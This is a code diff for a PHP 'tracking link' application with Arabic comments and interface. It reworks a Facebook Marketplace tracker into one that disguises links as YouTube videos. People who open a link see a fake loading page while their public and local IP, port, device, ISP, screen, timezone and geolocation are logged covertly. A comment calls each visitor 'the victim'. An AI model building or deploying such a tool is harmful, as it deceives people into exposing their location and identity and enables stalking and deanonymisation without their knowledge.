@@ -1,11 +1,14 @@
 <?php
+// ضبط المنطقة الزمنية للجزائر بدقة
 date_default_timezone_set('Africa/Algiers');
 
+// إظهار الأخطاء للتشخيص
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker.db');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -33,19 +36,41 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
-    die("Database error: " . $e->getMessage());
+    die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-function fetch_real_meta($url) {$title = "";
+// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
+function fetch_real_meta($url) {
+    $title = "";
     $image = "";
 
-    // Special handler for Facebook Marketplace links
-    if (strpos($url, 'facebook.com/marketplace') !== false) {$ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,$url);
+    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
+        $video_id = $matches[1];
+        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
+        
+        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $oembed_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        $json = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($json) {
+            $data = json_decode($json, true);
+            if (isset($data['title'])) {
+                $title = $data['title'];
+            }
+        }
+    }
+
+    if (empty($title)) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
         $html = curl_exec($ch);
         curl_close($ch);
 
@@ -56,38 +81,10 @@ function fetch_real_meta($url) {$title = "";
             $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
             if ($titleNodes->length > 0) {
                 $title =$titleNodes->item(0)->nodeValue;
-            }
-
-            $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
-            if ($imageNodes->length > 0) {
-                $image =$imageNodes->item(0)->nodeValue;
-            }
-        }
-    }
-
-    // Fallback general scraper if meta tags are empty
-    if (empty($title) || empty($image)) {$ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,$url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
-        $html = curl_exec($ch);
-        curl_close($ch);
-
-        if ($html) {$dom = new DOMDocument();
-            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
-            $xpath = new DOMXPath($dom);
-
-            if (empty($title)) {
-                $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
-                if ($titleNodes->length > 0) {
-                    $title =$titleNodes->item(0)->nodeValue;
-                } else {
-                    $nodes =$dom->getElementsByTagName('title');
-                    if ($nodes->length > 0) {
-                        $title =$nodes->item(0)->nodeValue;
-                    }
+            } else {
+                $nodes =$dom->getElementsByTagName('title');
+                if ($nodes->length > 0) {
+                    $title =$nodes->item(0)->nodeValue;
                 }
             }
 
@@ -100,9 +97,10 @@ function fetch_real_meta($url) {$title = "";
         }
     }
 
-    if (empty($title)) {$title = "Facebook Marketplace Listing";
+    if (empty($title)) {
+        $title = parse_url($url, PHP_URL_HOST);
     }
-    if (empty($image)) {$image = "https://images.unsplash.com/photo-1555421689-491a97ff2040?w=600&auto=format&fit=crop&q=60";
+    if (empty($image)) {$image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
     }
 
     return ['title' => trim($title), 'image' => trim($image)];
@@ -155,10 +153,11 @@ function get_ip_details($ip) {
     return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
 }
 
-$og_title = "Marketplace Listing";
-$og_image = "https://images.unsplash.com/photo-1555421689-491a97ff2040?w=600&auto=format&fit=crop&q=60";
+$og_title = "YouTube";
+$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
+// 1. معالجة طلب الزائر عبر رابط التعقب (إذا كان يحتوي على معامل r)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
@@ -170,6 +169,7 @@ if (isset($_GET['r'])) {
         $og_title =$link['meta_title'];
         $og_image =$link['meta_image'];
 
+        // إذا أرسل السكريبت بيانات الشاشة والـ IP المحلي في الخلفية
         if (isset($_GET['save_log']) &&$_GET['save_log'] == '1') {
             $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? $public_ip;
             $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');
@@ -185,6 +185,7 @@ if (isset($_GET['r'])) {
     }
 }
 
+// 2. إنشاء رابط جديد من لوحة التحكم
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -203,6 +204,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
+// جلب السجلات للوحة التحكم
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
@@ -212,10 +214,11 @@ if (!empty($filter_code)) {
     $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
 }
 
+// إذا كان الطلب عبارة عن زيارة رابط تعقب (موجه للضحية)، نعرض واجهة وهمية تخفي لوحة التحكم تماماً وتوجهه لليوتيوب
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <title><?php echo htmlspecialchars($og_title); ?></title>
@@ -223,8 +226,8 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
     <style>
-        body { background-color: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #3b82f6; animation: spin 1s linear infinite; }
+        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #ff0000; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
     <script>
@@ -289,12 +292,13 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     exit(); 
 endif; 
 ?>
+<!-- لوحة التحكم الخاصة بك (تظهر فقط لك عندما تزور الرابط الرئيسي دون المعامل r) -->
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Marketplace Tracking Control Panel</title>
+    <title>لوحة التحكم والتعقب</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -341,7 +345,7 @@ endif;
         .search-form { display: flex; gap: 8px; max-width: 380px; width: 100%; }
 
         .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 6px; }
-        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; min-width: 1000px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
         th { background: #0f172a; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: 600; white-space: nowrap; text-transform: uppercase; }
         td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #cbd5e1; white-space: nowrap; }
         tr:hover { background: rgba(30, 41, 59, 0.4); }
@@ -360,14 +364,14 @@ endif;
                 const text = await navigator.clipboard.readText();
                 document.querySelector(`input[name="${inputName}"]`).value = text;
             } catch (err) {
-                alert('Clipboard paste failed.');
+                alert('فشل اللصق التلقائي، يرجى اللصق يدوياً (Ctrl+V)');
             }
         }
 
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
                 const original = btnElement.innerText;
-                btnElement.innerText = "Copied";
+                btnElement.innerText = "تم النسخ";
                 btnElement.style.background = "#10b981";
                 setTimeout(() => {
                     btnElement.innerText = original;
@@ -380,46 +384,48 @@ endif;
 <body>
     <div class="wrapper">
         
+        <!-- قسم توليد الروابط -->
         <section class="section-box">
-            <h2>Generate Marketplace Tracking Link</h2>
+            <h2>توليد رابط تعقب جديد</h2>
             <form method="POST" class="form-row">
                 <div class="input-action-group">
-                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('target_url')">Paste</button>
-                    <input type="text" name="target_url" placeholder="Enter Facebook Marketplace URL here..." required>
+                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('target_url')">لصق</button>
+                    <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف هنا..." required>
                 </div>
-                <button type="submit" name="create" class="btn">Generate</button>
+                <button type="submit" name="create" class="btn">توليد الرابط</button>
             </form>
 
             <?php if (!empty($generated_link)): ?>
                 <div class="result-panel">
-                    <label>Active Tracking Link:</label>
+                    <label>رابط التعقب النشط:</label>
                     <div class="link-flex">
                         <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
-                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy Link</button>
+                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
                     </div>
                     
                     <div class="big-tracking-code-box">
-                        <span>Tracking Code</span>
+                        <span>كود التعقب الخاص بالرابط</span>
                         <div class="big-code-val"><?php echo htmlspecialchars($tracking_code); ?></div>
-                        <button type="button" class="btn btn-secondary" style="margin-top: 10px; height: 36px; font-size: 11px;" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">Copy Code</button>
+                        <button type="button" class="btn btn-secondary" style="margin-top: 10px; height: 36px; font-size: 11px;" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود</button>
                     </div>
 
                     <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 12px; font-size: 12px;">
-                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">View logs for this code exclusively →</a>
+                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #38bdf8; text-decoration: none;">عرض سجلات هذا الكود حصرياً ←</a>
                     </div>
                 </div>
             <?php endif; ?>
         </section>
 
+        <!-- قسم السجلات الحية -->
         <section class="section-box">
             <div class="toolbar">
-                <h2>Live Visit Logs & Analytics</h2>
+                <h2>سجلات الزيارات والتحليلات الحية</h2>
                 <form method="GET" class="search-form">
-                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">Paste</button>
-                    <input type="text" name="track" placeholder="Search by tracking code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
-                    <button type="submit" class="btn" style="height: 42px;">Search</button>
+                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">لصق</button>
+                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
+                    <button type="submit" class="btn" style="height: 42px;">بحث</button>
                     <?php if(!empty($filter_code)): ?>
-                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">إلغاء</a>
                     <?php endif; ?>
                 </form>
             </div>
@@ -429,20 +435,20 @@ endif;
                     <thead>
                         <tr>
                             <th>#ID</th>
-                            <th>Code</th>
-                            <th>Public IP</th>
-                            <th>Local IP</th>
-                            <th>Port</th>
-                            <th>Device</th>
-                            <th>Geolocation</th>
-                            <th>ISP</th>
-                            <th>Screen & TZ</th>
-                            <th>Timestamp</th>
+                            <th>الكود</th>
+                            <th>IP العام</th>
+                            <th>IP المحلي</th>
+                            <th>المنفذ</th>
+                            <th>الجهاز</th>
+                            <th>الموقع الجغرافي</th>
+                            <th>مزود الخدمة</th>
+                            <th>الشاشة والمنطقة</th>
+                            <th>الوقت (التوقيت الجزائري)</th>
                         </tr>
                     </thead>
                     <tbody>
                         <?php if (empty($logs)): ?>
-                            <tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 30px;">No visit logs found.</td></tr>
+                            <tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 30px;">لا توجد أي سجلات زيارات مطابقة.</td></tr>
                         <?php else: ?>
                             <?php foreach ($logs as$log): ?>
                             <tr>
@@ -456,7 +462,7 @@ endif;
                                 <td style="font-weight: 500; color: #f8fafc;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
-                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #38bdf8; text-decoration: none;">View Map ↗</a>
+                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #38bdf8; text-decoration: none;">عرض الخريطة ↗</a>
                                 </td>
                                 <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                 <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
@@ -471,6 +477,7 @@ endif;
 
     </div>
 
+    <!-- التذييل -->
     <footer>
         <p>Powered by <span>azeez</span> &copy; 2026</p>
     </footer>
